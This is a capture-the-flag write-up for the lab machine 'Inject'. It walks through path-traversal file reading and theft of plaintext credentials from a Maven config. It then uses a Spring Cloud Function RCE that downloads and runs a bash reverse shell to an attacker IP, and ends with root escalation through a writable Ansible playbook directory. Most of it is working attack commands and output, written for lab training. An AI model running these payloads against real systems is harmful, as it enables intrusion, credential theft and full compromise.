# Inject

First, run a standard scan with nmap to discover open ports !
```
sudo nmap -sS --min-rate 5000 --open -Pn -n -vvv -p- 10.10.11.204 -oG allPorts
```

To get the details and version
```
nmap -sC -sV -p22,8080 10.10.11.204 -oN targeted
```

After inspecting the web page at `http://10.10.11.204:8080`, you'll notice there's an `upload` section in the right corner! Let's intercept the request with Burp Suite!
```
//TODO
```

Trying to upload a file with .sh or .php extensions appears to be impossible. But when an image named `test.jpg` (for example) is uploaded, we get this URL in the response
```
http://10.10.11.204:8080/show_image?img=test.jpg
```

The `show_image` variable seems to be exploitable ! Let's attempt some trials with GET requests !
```
curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../../etc/passwd" > passwd
```

Indeed, we have the ```/etc/passwd``` file from the machine! So we have an LFI vulnerability !!!
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
```

We can extract users form this file !
```
cat ./content/passwd | grep "bash" | awk -F ":" '{print $1}'
```

There are 3 users !
```
root
frank
phil
```

Let's find out our present working director !
```
curl -s -X GET "http://10.10.11.204:8080/show_image?img=blablabl" | jq
```

The return output is the following !
```
{
  "timestamp": "2023-07-09T15:47:24.801+00:00",
  "status": 500,
  "error": "Internal Server Error",
  "message": "URL [file:/var/www/WebApp/src/main/uploads/blablabl] cannot be resolved in the file system for checking its content length",
  "path": "/show_image"
}
```
> This indicates that we are in the `/var/www/WebApp/src/main/uploads/` directory!


Let's delve into the `home` directory, starting with Frank
```
curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../home/frank"
```

In the output listing, there's a `.m2` directory
```
.bash_history
.bashrc
.cache
.gnupg
.local
.m2
.profile
.ssh
```

Let's take a look at it !
```
curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2"
```

We have a ```settings.xml``` file ! let's check its content !
```
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema
-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/mave
n-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

We now have some information about the user `Phil` !
```
user: phil
psswd: DocPhillovestoInject123
```

I tried connecting with `ssh` using the credentials but it seemed impossible...
```
ssh phil@10.10.11.204
```

Let's check if other directories have interesting files. For example, in  ```/var/www/WebApp/```
```
curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../.."
```

In the output there's a ```pom.xml``` file !
```
.classpath
.DS_Store
.idea
.project
.settings
HELP.md
mvnw
mvnw.cmd
pom.xml
src
target
```

Let's view its content
```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.6.5</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.example</groupId>
    <artifactId>WebApp</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>WebApp</name>
    <description>Demo project for Spring Boot</description>
    <properties>
        <java.version>11</java.version>
    </properties>
    ...
```
> It appears that the project runs on `Spring Framework`!

Let's search for an exploit (if there is one). We have found this [repository](https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit) !

Upon reading the script, note that the request header looks like this:
```
curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("{cmd}")' -d '.'
```
> Where ```{cmd}``` should be replaced by a command !

So, let's create our reverse shell called [`index.html`](./exploits/index.html)
```
#!/bin/sh

bash -i >& /dev/tcp/10.10.16.56/9999 0>&1
```

To share the file, we need to create a python server in the exploit file directory!
```
python -m http.server 9000
```

Now, we need to send (and rename) our exploit to the target machine using the request format above!
```
curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl 10.10.16.56:9999/index.html -o /tmp/revshell")' -d '.'
```

Once that's done, we need to set up the listener! In the exploit file, we've set the port to 9999, so
```
nc -lvnp 9999
```

Let's execute it !
```
curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("/bin/bash /tmp/revshell")' -d '.'
```

We're in! We're now using the user `Frank`!
```
frank@inject:/
```

Let's try to use the credentials we found earlier!
```
frank@inject:~$ su phil
Password: DocPhillovestoInject123
```

It worked! We're now `Phil`!

```
phil@inject:/
```

Let's check the user flag !
```
cat /home/phil/user.txt
```

Go it !!!
```
2a4a2bf19bb1198f5ef0441d302e7b87
```

Let's see if there are any binaries with SUID permissions
```
find / -perm -u=s 2>/dev/null
```
> Nothing interesting...


Let's check our `id`
```
phil@inject:/ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
```

Let's check out permissions and privileges with the `staff` group
```
find / -group staff 2>/dev/null
```

The first path of the output gives us a clue about the privilege escalation...
```
/opt/automation/tasks
/root
/var/local
...
```

In our `home` directory, we have the `pspy64` binary, which is for comparing processes! Let's check for CRON tasks then!
```
2023/07/09 14:42:01 CMD: UID=0     PID=70496  | /bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
2023/07/09 14:42:01 CMD: UID=0     PID=70497  | /usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/playbook_1.yml
2023/07/09 14:42:09 CMD: UID=0     PID=70594  | /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1688913728.344112-70575-115364851993038/AnsiballZ_systemd.py
2023/07/09 14:42:09 CMD: UID=0     PID=70593  | /bin/sh -c /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1688913728.344112-70575-115364851993038/AnsiballZ_systemd.py && sleep 0
2023/07/09 14:42:09 CMD: UID=0     PID=70595  | /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1688913728.344112-70575-115364851993038/AnsiballZ_systemd.py
2023/07/09 14:42:10 CMD: UID=0     PID=70598  | /bin/sh -c /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1688913728.344112-70575-115364851993038/AnsiballZ_systemd.py && sleep 0
2023/07/09 14:42:10 CMD: UID=0     PID=70599  | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml
2023/07/09 14:42:11 CMD: UID=0     PID=70600  | /bin/sh -c rm -f -r /root/.ansible/tmp/ansible-tmp-1688913728.344112-70575-115364851993038/ > /dev/null 2>&1 && sleep 0
```

The output reveals that there's a cron job running for the root user. Indeed, the root deletes all files in `/opt/automation/tasks/*`, then it copies a script named `playbook_1.yml` from its home directory to the `/opt/automation/tasks/*` directory, and finally, it executes all the scripts in the directory!


Before proceeding, let's look up `ansible` on the internet and check the [`playbook_1.yml`](./content/playbook_1.yml) format
```
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

According to the Ansible documentation, we can run commands! So, let's create an ```exploit.yml``` !
```
 hosts: localhost
 tasks:
 - name: Checking webapp service
   ansible.builtin.shell: chmod u+s /bin/bash
```
> This script will assign SUID permission to the shell, enabling us to gain root access!

Once the file is created in the `/opt/automation/tasks` directory, check periodically to see if the SUID privilege is set up in the bash by using:
```
phil@inject:/opt/automation/tasks$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Within 10 seconds (approx), we should see this
```
phil@inject:/opt/automation/tasks$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Now, let's get root access!
```
phil@inject:/opt/automation/tasks$ /bin/bash -p
bash-5.0# whoami
root
```

Finally, after gaining root access, we can check the (`root`)[./root.txt] flag !
```
bash-5.0# cat /root/root.txt
f8c8c8b90b95e35c53171e4c3acc0323
```
